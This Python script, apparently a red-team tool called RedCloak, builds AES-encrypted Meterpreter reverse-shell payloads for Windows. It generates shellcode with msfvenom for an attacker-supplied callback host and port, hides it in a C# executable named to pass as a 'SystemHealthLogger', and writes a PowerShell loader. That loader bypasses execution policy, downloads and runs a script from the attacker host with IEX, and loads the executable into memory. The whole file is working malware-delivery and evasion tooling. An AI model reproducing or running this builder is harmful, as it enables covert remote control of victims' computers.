import os
import subprocess
import sys
import shutil
import gzip
import base64
import time
from io import BytesIO
import re
import json
import argparse
from colorama import init, Fore
from colorama import Fore, Style

# =========================================================
# RedClock Banner
# =========================================================

def print_banner():
    banner = f"""{Fore.RED}
  _____          _  _____ _             _    
 |  __ \\        | |/ ____| |           | |   
 | |__) |___  __| | |    | | ___   __ _| | __
 |  _  // _ \\/ _` | |    | |/ _ \\ / _` | |/ /
 | | \\ \\  __/ (_| | |____| | (_) | (_| |   < 
 |_|  \\_\\___|\\__,_|\\_____|_|\\___/ \\__,_|_|\\_\\
{Style.RESET_ALL}
{Fore.CYAN}RedCloak | AES Shellcode Builder
Author     : Narasimha Tiruveedula
Github     : github.com/Alien0ne
LinkedIn   : linkedin.com/in/narasimhatiruveedula/
Discord    : .alienone{Style.RESET_ALL}
"""
    print(banner)

# =========================================================
# RedClock Progress Bar
# =========================================================

init(autoreset=True)

def redclock(steps, delay=0.2):
    for i, step in enumerate(steps, 1):
        bar = "■" * i + "□" * (len(steps) - i)
        print(Fore.RED + f"[{bar}] {step}")
        time.sleep(delay)
    print()

# =========================================================
# ARGPARSE (CLI MODE)
# =========================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="RedCloak — AES-encrypted Meterpreter payload builder (OSEP-ready)",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "--lhost",
        required=True,
        help="Callback IP address (C2)"
    )

    parser.add_argument(
        "--lport",
        required=True,
        help="Callback port"
    )

    parser.add_argument(
        "--payload",
        required=True,
        choices=[
            "windows/x64/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_https"
        ],
        help="Payload type"
    )

    return parser.parse_args()

args = parse_args()

payload = args.payload
lhost = args.lhost
lport = args.lport

if __name__ == "__main__":
    print_banner()

# =========================================================
# WSL CHECK
# =========================================================

def check_wsl_installed():
    if not shutil.which("wsl"):
        print(Fore.RED + "[-] WSL not detected. RedClock cannot tick without Linux.")
        print("    Install with: wsl --install")
        sys.exit(1)

    try:
        result = subprocess.run(
            ["wsl", "echo", "WSL_OK"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode != 0 or "WSL_OK" not in result.stdout:
            raise Exception
    except Exception:
        print(Fore.RED + "[-] WSL present but malfunctioning.")
        print("    Try: wsl --status")
        sys.exit(1)

    redclock([
        "Initializing RedClock...",
        "Locating WSL subsystem...",
        "Linux bridge established",
        "WSL operational"
    ])

check_wsl_installed()

# =========================================================
# CONFIG LOAD & VALIDATION
# =========================================================

print(Fore.CYAN + "[*] Loading operator configuration...")

try:
    with open("config.json", "r") as f:
        config = json.load(f)
except FileNotFoundError:
    print(Fore.RED + "[-] config.json missing. RedClock aborted.")
    sys.exit(1)

for key in ["MSBUILD_PATH", "WSL_BASE"]:
    if key not in config:
        print(Fore.RED + f"[-] Missing {key} in config.json")
        sys.exit(1)

msbuild_path = config["MSBUILD_PATH"]
wsl_base = config["WSL_BASE"]

if not os.path.exists(msbuild_path):
    print(Fore.RED + "[-] MSBUILD_PATH invalid.")
    sys.exit(1)

if subprocess.run(["wsl", "test", "-d", wsl_base]).returncode != 0:
    print(Fore.RED + "[-] WSL_BASE invalid.")
    sys.exit(1)

redclock([
    "Parsing config.json",
    "MSBuild path verified",
    "WSL base validated",
    "Configuration locked"
])

# =========================================================
# PATH SETUP
# =========================================================

WIN_BASE = os.path.abspath(os.path.dirname(__file__))

CS_PROJECT_DIR = os.path.join(WIN_BASE, "SystemHealthLogger", "SystemHealthLogger")
CSPROJ = os.path.join(CS_PROJECT_DIR, "SystemHealthLogger.csproj")
PROGRAM_CS = os.path.join(CS_PROJECT_DIR, "Program.cs")
BUILT_EXE = os.path.join(CS_PROJECT_DIR, "bin", "x64", "Release", "SystemHealthLogger.exe")

# =========================================================
# OUTPUT DIRECTORY
# =========================================================

folder = f"{payload.replace('/', '_')}_{lhost.replace('.', '_')}_{lport}"
OUTPUT_ROOT = os.path.join(WIN_BASE, "output")
OUTDIR = os.path.join(OUTPUT_ROOT, folder)

os.makedirs(OUTDIR, exist_ok=True)
os.chdir(OUTDIR)

redclock([
    "Payload parameters locked",
    "Creating output directory",
    "Operation sandbox ready"
])

# =========================================================
# MSFVENOM
# =========================================================

shellcode_win = os.path.join(WIN_BASE, "shellcode.bin")
shellcode_wsl = f"{wsl_base}/shellcode.bin"

subprocess.run(
    [
        "wsl", "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-a", "x64",
        "--platform", "windows",
        "-o", shellcode_wsl
    ],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    check=True
)

redclock([
    "Shellcode forged",
    "Payload staged",
    "Ready for encryption"
])

# =========================================================
# AES ENCRYPTION
# =========================================================

aes_dir = os.path.join(WIN_BASE, "AESShellcodeEncryptor", "AESShellcodeEncryptor")
aes_csproj = os.path.join(aes_dir, "AESShellcodeEncryptor.csproj")
aes_built = os.path.join(aes_dir, "bin", "x64", "Release", "AESShellcodeEncryptor.exe")
aes_tmp = os.path.join(WIN_BASE, "AESShellcodeEncryptor.exe")

subprocess.run(
    [msbuild_path, aes_csproj, "/t:Build", "/p:Configuration=Release", "/p:Platform=x64"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    check=True
)

shutil.copy2(aes_built, aes_tmp)

subprocess.run(
    f'"{aes_tmp}" shellcode.bin payload.txt',
    shell=True,
    cwd=WIN_BASE,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    check=True
)

os.remove(aes_tmp)

redclock([
    "AES engine compiled",
    "Shellcode encrypted",
    "Crypto artifacts ready"
])

# =========================================================
# PATCH Program.cs
# =========================================================

with open(os.path.join(WIN_BASE, "payload.txt"), "r") as f:
    data = f.read()

aes_key = re.search(r"AES Key.*?\n([A-Za-z0-9+/=]+)", data, re.S).group(1)
enc_sc = re.search(r"Encrypted Shellcode.*?\n([A-Za-z0-9+/=]+)", data, re.S).group(1)

with open(PROGRAM_CS, "r") as f:
    cs = f.read()

cs = re.sub(r'string\s+a\s*=\s*".*?";', f'string a = "{aes_key}";', cs)
cs = re.sub(r'string\s+b\s*=\s*".*?";', f'string b = "{enc_sc}";', cs)

with open(PROGRAM_CS, "w") as f:
    f.write(cs)

shutil.copy2(PROGRAM_CS, os.path.join(OUTDIR, "RedCloak.cs"))

redclock([
    "Program.cs loaded",
    "AES key injected",
    "RedCloak.cs archived"
])

# =========================================================
# BUILD PAYLOAD
# =========================================================

subprocess.run(
    [msbuild_path, CSPROJ, "/t:Build", "/p:Configuration=Release", "/p:Platform=x64"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    check=True
)

shutil.copy2(BUILT_EXE, os.path.join(OUTDIR, "SystemHealthLogger.exe"))

# =========================================================
# PS1 LOADER
# =========================================================

with open(os.path.join(OUTDIR, "SystemHealthLogger.exe"), "rb") as f:
    exe_bytes = f.read()

buf = BytesIO()
with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
    gz.write(exe_bytes)

b64 = base64.b64encode(buf.getvalue()).decode()

ps1 = f"""if (-not [Environment]::Is64BitProcess -and [Environment]::Is64BitOperatingSystem) {{
    $ps64 = "$env:WINDIR\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe"
    & $ps64 -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/rev.ps1')"
    Start-Sleep -Seconds 45
    exit
}}
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String("{b64}"))
$gz = New-Object System.IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress)
$out = New-Object System.IO.MemoryStream
$gz.CopyTo($out)
[byte[]]$exeBytes = $out.ToArray()
$asm = [Reflection.Assembly]::Load($exeBytes)
[SystemHealthLogger.MainController]::Main($null)
"""

with open(os.path.join(OUTDIR, "rev.ps1"), "w", encoding="ascii") as f:
    f.write(ps1)

# =========================================================
# FINALIZE
# =========================================================

shutil.move(shellcode_win, os.path.join(OUTDIR, "shellcode.bin"))
shutil.move(os.path.join(WIN_BASE, "payload.txt"), os.path.join(OUTDIR, "payload.txt"))

redclock([
    "Artifacts moved",
    "Workspace cleaned",
    "RedClock mission complete"
])

print(Fore.GREEN + f"\n[+] Output ready at: {OUTDIR}")
